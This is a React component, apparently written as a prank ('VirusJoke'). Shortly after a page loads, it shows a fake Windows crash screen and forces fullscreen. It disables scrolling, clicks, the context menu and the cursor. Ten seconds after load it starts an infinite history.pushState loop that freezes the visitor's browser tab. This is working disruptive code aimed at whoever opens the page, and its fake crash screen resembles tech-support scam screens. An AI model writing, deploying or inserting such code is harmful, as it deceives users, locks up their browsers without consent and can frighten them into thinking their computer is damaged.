"use client";

import { useEffect, useState } from "react";

export function VirusJoke() {
  const [stage, setStage] = useState(0);

  useEffect(() => {
    // Stage 1: Blue Screen of Death
    const stage1 = setTimeout(() => {
      setStage(1);
      // Try to go fullscreen if possible (requires user interaction usually)
      try {
        if (document.documentElement.requestFullscreen) {
          document.documentElement.requestFullscreen().catch(() => {});
        }
      } catch (e) {}
      
      // Block scrolling
      document.body.style.overflow = "hidden";
    }, 5000); // 5 seconds after load

    // Stage 2: Freeze the tab completely
    const stage2 = setTimeout(() => {
      setStage(2);
      setTimeout(() => {
        while(true) {
          history.pushState(null, "", window.location.href);
        }
      }, 500);
    }, 10000); // 10 seconds after load

    return () => {
      clearTimeout(stage1);
      clearTimeout(stage2);
      document.body.style.overflow = "";
    };
  }, []);

  if (stage === 0) return null;

  return (
    <div 
      style={{ 
        position: "fixed", 
        inset: 0, 
        zIndex: 9999999, 
        backgroundColor: "#0078D7",
        color: "white",
        fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
        padding: "10%",
        display: "flex",
        flexDirection: "column",
        pointerEvents: "auto",
        cursor: "none"
      }}
      onClick={(e) => e.preventDefault()}
      onContextMenu={(e) => e.preventDefault()}
    >
      <h1 style={{ fontSize: "10rem", margin: "0 0 20px 0", fontWeight: "normal" }}>:(</h1>
      <p style={{ fontSize: "2.5rem", marginBottom: "40px", lineHeight: "1.4" }}>
        Your PC ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you.
      </p>
      <div style={{ display: "flex", alignItems: "center", gap: "20px", marginBottom: "40px" }}>
        <p style={{ fontSize: "2rem" }}>
          <span style={{ fontWeight: "bold" }}>0%</span> complete
        </p>
      </div>
      <div style={{ display: "flex", gap: "30px", alignItems: "center" }}>
        <div style={{ width: "120px", height: "120px", background: "white", padding: "10px", flexShrink: 0 }}>
          {/* Fake QR Code */}
          <div style={{ width: "100%", height: "100%", display: "grid", gridTemplateColumns: "repeat(6, 1fr)", gridTemplateRows: "repeat(6, 1fr)", gap: "2px" }}>
             {Array.from({length: 36}).map((_, i) => (
                <div key={i} style={{ background: Math.random() > 0.4 ? "black" : "white" }} />
             ))}
          </div>
        </div>
        <div style={{ fontSize: "1.2rem", display: "flex", flexDirection: "column", justifyContent: "center", gap: "8px" }}>
          <p style={{ margin: 0 }}>For more information about this issue and possible fixes, visit https://www.windows.com/stopcode</p>
          <p style={{ margin: 0 }}>If you call a support person, give them this info:</p>
          <p style={{ margin: 0 }}>Stop code: CRITICAL_PROCESS_DIED</p>
        </div>
      </div>
    </div>
  );
}
